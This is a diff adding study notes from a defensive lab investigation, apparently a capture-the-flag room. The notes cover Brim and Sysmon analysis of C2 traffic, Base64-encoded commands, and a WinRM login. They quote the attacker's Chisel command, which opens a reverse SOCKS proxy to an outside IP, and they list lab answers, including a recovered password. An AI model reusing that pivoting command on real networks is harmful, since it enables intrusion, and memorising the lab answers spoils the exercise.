@@ -412,3 +412,309 @@ Event ID 22 = DNS Query
 
 Main lesson: attackers often use the **Startup folder** for persistence and legitimate Windows tools like **PowerShell** and **certutil.exe** to download and execute payloads.
 ---
+## Short Note: Malicious Document Traffic — Brim Analysis
+
+In this part, I used **Brim** to analyze the packet capture `capture.pcapng`. From Sysmon, we already knew the malicious domains:
+
+```text
+phishteam.xyz
+resolvecyber.xyz
+```
+
+So in Brim, I searched HTTP traffic related to these domains.
+
+---
+
+### 1. Malicious payload URL embedded in the document
+
+Brim filter:
+
+```zed
+_path=="http" && host=="phishteam.xyz"
+```
+
+I checked the `host` and `uri` fields, then combined them:
+
+```text
+host = phishteam.xyz
+uri  = /02dcf07/index.html
+```
+
+Answer:
+
+```text
+http://phishteam.xyz/02dcf07/index.html
+```
+
+---
+
+### 2. Encoding used on the C2 connection
+
+In the HTTP traffic, the command/result data appeared encoded. The value matched **Base64** format.
+
+Answer:
+
+```text
+base64
+```
+
+---
+
+### 3. Parameter used to send command results
+
+Brim filter:
+
+```zed
+_path=="http" && host=="resolvecyber.xyz"
+```
+
+I checked the HTTP `uri` field and saw the payload/result being sent through a URL parameter:
+
+```text
+?q=...
+```
+
+Answer:
+
+```text
+q
+```
+
+---
+
+### 4. URL used by the binary to get commands
+
+The Stage 2 binary connected to the C2 server to receive commands. In Brim, the HTTP request showed this URI:
+
+```text
+/9ab62b5
+```
+
+Answer:
+
+```text
+/9ab62b5
+```
+
+---
+
+### 5. HTTP method used by the binary
+
+In the same HTTP event, I checked the `method` field.
+
+Answer:
+
+```text
+GET
+```
+
+---
+
+### 6. Programming language used to compile the binary
+
+The HTTP `user_agent` field showed:
+
+```text
+Nim httpclient/1.6.6
+```
+
+This means the binary was likely written in **Nim** and used Nim’s HTTP client library.
+
+Answer:
+
+```text
+nim
+```
+
+---
+
+## What I Learned
+
+I learned how to use **Brim** to investigate malware network traffic from a PCAP:
+
+```text
+Search malicious domains
+Filter HTTP traffic
+Check host + uri for full URLs
+Check method for HTTP action
+Check parameters for exfiltrated command output
+Check user_agent to identify malware language/tooling
+```
+
+Useful Brim filters:
+
+```zed
+_path=="http" AND host=="phishteam.xyz"
+```
+
+```zed
+_path=="http" AND host=="resolvecyber.xyz"
+```
+
+```zed
+_path=="http" AND id.resp_h==167.71.222.162
+```
+
+Main idea:
+
+```text
+Sysmon showed the domains/IPs.
+Brim showed the real HTTP communication, URLs, parameters, method, and User-Agent.
+```
+---
+## Short Note: Internal Reconnaissance
+
+In this stage, the Stage 2 malware was communicating with the C2 server and sending/receiving encoded commands. Using **Brim**, I checked HTTP traffic to the malicious C2 domain and decoded Base64 values to understand the attacker’s commands and outputs.
+
+### Brim filter for C2 traffic
+
+```zed id="91mlbe"
+_path=="http" "resolvecyber.xyz" id.resp_p==80 | cut ts, host, id.resp_p, uri | sort ts
+```
+
+I looked for encoded values in the URI, especially the `q=` parameter, then decoded them.
+
+### Decode Base64
+
+PowerShell:
+
+```powershell id="0jq1vc"
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_HERE"))
+```
+
+Linux:
+
+```bash id="3fvpgx"
+echo 'BASE64_HERE' | base64 -d
+```
+
+---
+
+## Answers and How They Were Found
+
+### 1. Password found in sensitive file
+
+Decoded C2 traffic showed the attacker discovered a sensitive file containing the password.
+
+Answer:
+
+```text id="3fyi87"
+infernotempest
+```
+
+---
+
+### 2. Listening port for remote shell
+
+Decoded enumeration output showed open/listening ports. Port `5985` is used by **WinRM**, which can provide remote command execution.
+
+Answer:
+
+```text id="a62mot"
+5985
+```
+
+---
+
+### 3. Reverse SOCKS proxy command
+
+In **Timeline Explorer**, I filtered:
+
+```text id="ng4gja"
+EventId = 1
+```
+
+Then searched:
+
+```text id="iiv97v"
+socks
+```
+
+or:
+
+```text id="3xz5rf"
+ch.exe
+```
+
+The command found was:
+
+```text id="sks1tv"
+C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
+```
+
+This created a reverse SOCKS proxy so the attacker could access internal services through the victim machine.
+
+---
+
+### 4. SHA256 hash of reverse SOCKS binary
+
+In the same `ch.exe` Sysmon Event ID 1 process event, I checked the `Hashes` field.
+
+Answer:
+
+```text id="bl119e"
+8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
+```
+
+---
+
+### 5. Tool name from hash
+
+The hash identified the tool as **Chisel**, a tunneling/proxy tool often abused for pivoting.
+
+Answer:
+
+```text id="b4r259"
+chisel
+```
+
+---
+
+### 6. Service used to authenticate
+
+After the SOCKS proxy execution, I checked succeeding process events. WinRM activity may appear as:
+
+```text id="weo3v0"
+wsmprovhost.exe
+```
+
+WinRM uses port:
+
+```text id="nc7vdh"
+5985
+```
+
+Answer:
+
+```text id="f1jzqv"
+winrm
+```
+
+---
+
+## Main Concept Learned
+
+The attacker used C2 traffic to run commands, decode results, find credentials, enumerate open ports, and then create a reverse SOCKS proxy using Chisel.
+
+Attack flow:
+
+```text id="b3wp8e"
+Stage 2 malware
+→ communicates with resolvecyber.xyz:80
+→ sends/receives Base64 encoded commands
+→ attacker finds password infernotempest
+→ attacker finds WinRM port 5985
+→ attacker runs ch.exe / Chisel reverse SOCKS proxy
+→ attacker authenticates using WinRM
+```
+
+Key tools/events:
+
+```text id="fvqp03"
+Brim = analyze HTTP C2 traffic
+Sysmon Event ID 1 = process creation
+Sysmon Hashes field = identify binary
+WinRM / wsmprovhost.exe = remote authentication/execution
+```
+---
+
